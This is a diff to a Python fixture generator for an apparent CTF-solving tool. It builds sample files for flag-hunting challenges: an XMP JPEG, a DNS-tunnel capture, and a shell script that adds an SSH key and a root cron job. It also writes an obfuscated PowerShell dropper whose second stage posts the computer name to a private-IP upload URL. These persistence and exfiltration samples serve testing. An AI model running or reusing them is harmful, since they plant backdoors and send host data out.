@@ -3307,6 +3307,113 @@ def write_exif_fixtures() -> None:
     write("exif_photo.jpg", exif_jpeg())
 
 
+# ---------------------------------------------------------------------------
+# Lot I: the flag one layer down (the 2026-11-11 audit of public challenges)
+# ---------------------------------------------------------------------------
+
+
+def jpeg_with_xmp(xmp: bytes) -> bytes:
+    """A JPEG whose only metadata is an XMP packet (APP1, Adobe's namespace).
+
+    Shape of picoCTF "CanYouSee": the flag sits in base64 in an XMP attribute,
+    which no EXIF reader parses. The "image" after it is filler: nothing here
+    decodes pixels.
+    """
+    payload = b"http://ns.adobe.com/xap/1.0/\x00" + xmp
+    app1 = b"\xff\xe1" + struct.pack(">H", len(payload) + 2) + payload
+    rng = random.Random(7)
+    scan = bytes(rng.randrange(256) for _ in range(1500)).replace(b"\xff", b"\xfe")
+    start_of_scan = b"\xff\xda\x00\x08\x01\x01\x00\x00\x3f\x00"
+    return b"\xff\xd8" + app1 + start_of_scan + scan + b"\xff\xd9"
+
+
+def dns_tunnel_capture() -> bytes:
+    """A capture where the DNS tunnel comes after 145 other objects.
+
+    Shape of DUCTF "Thats_Not_My_Name": every domain the browser touched is a
+    DNS candidate with a few queries, a lot of UDP chatter comes first, and the
+    real tunnel carries hex with the flag IN CLEAR once unhexed.
+    """
+    rng = random.Random(11)
+    client, resolver = "10.0.0.7", "10.0.0.1"
+    records, time = [], 1700001000
+
+    def udp(source: str, destination: str, ports: tuple[int, int], payload: bytes) -> bytes:
+        datagram = udp_datagram(ports[0], ports[1], payload)
+        return pcap_packet(ethernet_ipv4(source, destination, 17, datagram), time)
+
+    # 1. Chatter: 20 small UDP datagrams to as many ports.
+    for number in range(20):
+        payload = bytes(rng.randrange(256) for _ in range(40))
+        records.append(udp(client, "10.0.0.99", (30000 + number, 9000 + number), payload))
+    # 2. Browsing noise: 125 ordinary domains, three lookups each. Each one is a
+    #    DNS candidate of its own, all of them before the tunnel in the capture.
+    for site in range(125):
+        for index in range(3):
+            name = f"img{index}.site{site}.example"
+            records.append(udp(client, resolver, (41000 + index, 53), dns_query(name)))
+    # 3. The tunnel: binary junk around the flag, hex-encoded, 30 bytes a query.
+    secret = bytes(rng.randrange(256) for _ in range(200)) + b"CYBN{dns_tunn3l_in_cl34r}"
+    secret += bytes(rng.randrange(256) for _ in range(200))
+    encoded = secret.hex()
+    for number, start in enumerate(range(0, len(encoded), 60)):
+        name = f"{encoded[start : start + 60]}.tunnel.example.invalid"
+        records.append(udp(client, resolver, (42000 + number, 53), dns_query(name)))
+    header = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
+    return header + b"".join(records)
+
+
+def split_flag_script() -> bytes:
+    """A shell script holding the flag in two halves, neither of them whole.
+
+    Shape of HTB "It Has Begun": the first half is written backwards at the end
+    of an SSH key comment, the second half is base64 in a crontab line.
+    """
+    first, second = "CYBN{h4lf_0n3_", "4nd_h4lf_tw0!}"
+    cron = base64.b64encode(second.encode()).decode()
+    return (
+        "#!/bin/sh\n"
+        "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ "
+        f"admin@{first[::-1]}' >> /root/.ssh/authorized_keys\n"
+        f"echo '*/5 * * * * root /bin/sh -c \"{cron}\"' >> /etc/crontab\n"
+    ).encode()
+
+
+def two_stage_dropper() -> str:
+    """A PowerShell dropper whose second stage is reversed base64 with no padding.
+
+    Shape of HTB "Fake Boost": stage 1 hides stage 2 as a long reversed base64
+    string; stage 2 keeps the flag in two base64 variables. Nothing is ever
+    executed: ctfc reads it statically.
+    """
+    stage2 = (
+        '$part1 = "' + base64.b64encode(b"CYBN{st4g3_tw0_").decode() + '"\n'
+        '$part2 = "' + base64.b64encode(b"r3v3rs3d_b64}").decode() + '"\n'
+        "$url = 'http://10.0.0.9/upload'\n"
+        "Invoke-WebRequest -Uri $url -Method Post -Body $env:COMPUTERNAME\n"
+    )
+    stage2 += "#" * (-len(stage2) % 3)  # a length that base64-encodes with no '='
+    blob = base64.b64encode(stage2.encode()).decode()[::-1]
+    decode = '[sYSTeM.cOnVeRT]::FRoMBaSe64sTRing($jozeq3n[-1..-($jozeq3n.Length)] -join "")'
+    return f'$jozeq3n = "{blob}"\n$s = {decode}\n'
+
+
+def write_hunt_fixtures() -> None:
+    print("flag one layer down:")
+    xmp = (
+        b'<x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF><rdf:Description '
+        b'cc:attributionURL="' + base64.b64encode(b"CTF{x1mp_m3tad4ta_b4s364}") + b'"/>'
+        b"</rdf:RDF></x:xmpmeta>"
+    )
+    write("hunt_xmp_base64.jpg", jpeg_with_xmp(xmp))
+    write("hunt_dns_tunnel.pcap", dns_tunnel_capture())
+    write("hunt_split_flag.zip", small_zip("script.sh", split_flag_script()))
+    rng = random.Random(13)
+    noise = bytes(rng.randrange(256) for _ in range(300))
+    write("hunt_utf16.bin", noise + "CYBN{wid3_ch4r_fl4g}".encode("utf-16-le") + noise)
+    write("hunt_two_stage.ps1", two_stage_dropper())
+
+
 def main() -> None:
     FIXTURES.mkdir(exist_ok=True)
     print(f"writing fixtures to {FIXTURES}")
@@ -3507,6 +3614,7 @@ def main() -> None:
     write_mail_fixtures()
     write_audio_fixtures()
     write_php_fixtures()
+    write_hunt_fixtures()
 
 
 if __name__ == "__main__":
